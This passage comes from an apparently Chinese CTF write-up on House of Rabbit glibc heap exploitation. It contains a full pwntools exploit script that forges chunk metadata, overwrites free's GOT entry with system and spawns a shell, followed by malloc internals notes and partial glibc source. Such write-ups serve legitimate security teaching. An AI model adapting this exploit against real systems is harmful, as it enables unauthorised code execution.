块即可</p>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp：</h3>\n<blockquote>\n<p>脚本来源于网络</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'your choice >\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre> </pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># 1 0x10</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># 2 0x80</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># 3 0xA0000</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'Add>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">,</span>content2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Edt>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'addr>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'content>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre> </pre></td></tr><tr><td data-num=\"71\"></td><td><pre> </pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Del>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNi1ob3VzZS1vZi1yYWJiaXQ=\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#26-house-of-rabbit</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hMWV4Lm9ubGluZS8yMDIwLzEwLzE1L0hvdXNlLW9mLVJhYmJpdCVFNSVBRCVBNiVFNCVCOSVBMC8=\">https://a1ex.online/2020/10/15/House-of-Rabbit 学习 /</span></p>\n</blockquote>\n<blockquote>\n<p>增文</p>\n<p>malloc 全流程</p>\n<pre><code>首先是检查是否满足fastbin大小要求，满足且存在适合的chunk就从fastbin中分配\n\n然后检查是否满足smallbin，满足且存在适合的chunk就从smallbin中分配\n\n同时检查是否满足largebin，满足就计算一下所属的largebin的索引idx\n\n进行unsortedbin的处理过程，从后向前遍历unsortedbin链表，满足切割分配就切割分配，大小精确匹配就分配，大小不匹配的就根据大小装入largebin和smallbin\n\n注意：这里会检查申请大小是否超出系统内存！这是该版本malloc中唯一检查的地方，如果没有unsortedbin，就不进行检查\nunsortedbin处理完之后，从largebin中找满足大小要求的chunk分配，要么直接分配出去，要么切割分配出去，剩下的部分装入unsortedbin\n\nlargebin中最大的chunk范围是0x80000 - ∞\n从largebin中分配不检查申请大小是否超出系统内存\n最后在从top chunk分配，分配不了就用sysmalloc去映射内存或者扩大top chunk\n</code></pre>\n</blockquote>\n<blockquote>\n<p><code>malloc_consolidate</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* current fastbin being consolidated */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    maxfb<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* last fastbin (for loop control) */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> mchunkptr       p<span class=\"token punctuation\">;</span>                  <span class=\"token comment\">/* current chunk being consolidated */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> mchunkptr       nextp<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* next chunk to consolidate */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> mchunkptr       unsorted_bin<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* bin header */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> mchunkptr       first_unsorted<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* chunk to link to */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token comment\">/* These have same use as in free() */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> mchunkptr       nextchunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> INTERNAL_SIZE_T nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> INTERNAL_SIZE_T prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token keyword\">int</span>             nextinuse<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> mchunkptr       bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> mchunkptr       fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token function\">atomic_store_relaxed</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>av<span class=\"token operator\">-></span>have_fastchunks<span class=\"token punctuation\">,</span> false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> unsorted_bin <span class=\"token operator\">=</span> <span class=\"token function\">unsorted_chunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre> <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   Remove each chunk from fast bin and consolidate it, placing it</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   then in unsorted bin. Among other reasons for doing this,</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>   placing in unsorted bin avoids needing to calculate actual bins</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   until malloc is sure that chunks aren't immediately going to be</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>   reused anyway.</pre></td></tr><tr><td data-num=\"29\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> maxfb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> NFASTBINS <span class=\"token operator\">-</span> <span class=\"token 